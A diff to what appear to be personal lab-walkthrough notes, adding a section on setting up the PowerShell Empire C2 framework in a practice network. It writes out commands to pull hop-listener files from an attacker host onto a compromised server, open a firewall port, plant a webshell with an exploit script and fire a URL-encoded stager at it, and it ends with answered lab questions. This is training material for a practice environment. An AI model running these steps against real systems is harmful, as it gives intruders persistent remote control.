@@ -529,6 +529,117 @@ powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.81.
 
 ## Command and Control
 
+```shell
+sudo apt install powershell-empire starkiller
+
+sudo powershell-empire server
+#start empire server
+
+powershell-empire client
+#empire CLI client
+#alternative to GUI starkiller
+
+starkiller
+#GUI
+
+#create http listener and http_hop listener in starkiller
+#create multi/launcher stager for http_hop listener
+
+ssh root@10.200.81.200 -i id_rsa
+#connect to compromised server
+
+mkdir /tmp/hop-sv
+
+cd /tmp/hop-sv
+
+#in attacker machine, zip the http_hop files
+cd /tmp/http_hop && sudo zip -r hop.zip *
+
+sudo python3 -m http.server 80
+
+#in root ssh session on compromised server
+curl 10.50.82.104/hop.zip -o hop.zip
+
+unzip hop.zip
+
+ls
+#we have the required files
+
+firewall-cmd --zone=public --add-port 47202/tcp
+#disable port 47202 for http_hop
+
+php -S 0.0.0.0:47202 &>/dev/null &
+#PHP server to serve files
+
+ss -tulwn | grep 47202
+#we can confirm it is listening on port 47202
+
+#on attacker
+#copy multi/launcher stager from Starkiller
+#URL-encode the stager and execute it using the webshell uploaded earlier
+
+sshuttle -r root@10.200.81.200 --ssh-cmd "ssh -i id_rsa" 10.200.81.0/24 -x 10.200.81.200
+#connect to compromised server if not connected
+
+./43777.py
+#exploit to upload webshell
+
+curl -X POST http://10.200.81.150/web/exploit-sv.php -d "a=<URL-encoded stager here>"
+#now we have an agent in starkiller
+
+#use modules in starkiller
+```
+
+* C2 (Command and Control) Frameworks are used to consolidate attacker's position within network & simplify post-exploitation steps, and providing red teams with collaborative features.
+
+* ```Powershell Empire``` (or Empire) is a C2 framework built to attack mainly Windows targets; it has a GUI extension 'Starkiller'.
+
+* After starting the Empire server, we can use the command ```starkiller``` to get the GUI extension running; creds for login - "empireadmin:password123".
+
+* Sections of Empire:
+
+  * Listeners - listen for connection
+
+  * Stagers - payloads to create reverse shell; delivery mechanism for agents
+
+  * Agents - equivalent of Metasploit sessions
+
+  * Modules - used in conjunction with agents for further exploitation
+
+  * Plugins - extend functionality of framework
+
+* Create listener in Starkiller GUI using "Create" option - "Type" should be set to "http", and we can set other fields before clicking "Submit".
+
+* Similarly, we can create stager using the Stagers menu given and configuring the option to "multi/bash"; set other fields as required.
+
+* We can execute the stagers on target machine to get an agent being received by our waiting listener on Starkiller.
+
+* In Empire, "hop listeners" are used for getting agents back from a target with no outbound access; we can setup a hop listener in Starkiller with the compromised web server as host.
+
+* So, for the hop listener, we can set type 'http_hop', host as 'http://10.200.81.200:47202', port as '47202' and RedirectListener as our existing "http" listener we setup earlier.
+
+* Now, we need to get an agent back from the Git Server:
+
+  * Setup 'http' and 'http_hop' listener if not setup already
+  * Generate 'multi/launcher' stager with the 'Listener' option set to the 'http_hop' listener created earlier
+  * In the root SSH session for the compromised server (10.200.81.200), download the 'http_hop' files from attacker machine
+  * Disable the required port '47202' on the ```firewall-cmd```
+  * Serve the files using PHP server
+  * Use ```cURL``` and the webshell backdoor uploaded earlier in Git server, and execute the URL-encoded stager
+  * After sending the stager web request, we will get an agent in Starkiller
+
+* After completing the given steps, we have an agent from the Git Server in Starkiller.
+
+* We can use Modules in Starkiller - search for the "Sherlock" module in the Modules tab - select the module - in the module options, select the Agent and click 'Submit'.
+
+* We can go through the results in the 'Reporting' section of the main menu.
+
+```markdown
+1. Can we get an agent back from the git server directly? - Nay
+
+2. Using the help command for guidance: in Empire CLI, how would we run the whoami command inside an agent? - shell whoami
+```
+
 ## Personal PC
 
 ## AV Evasion
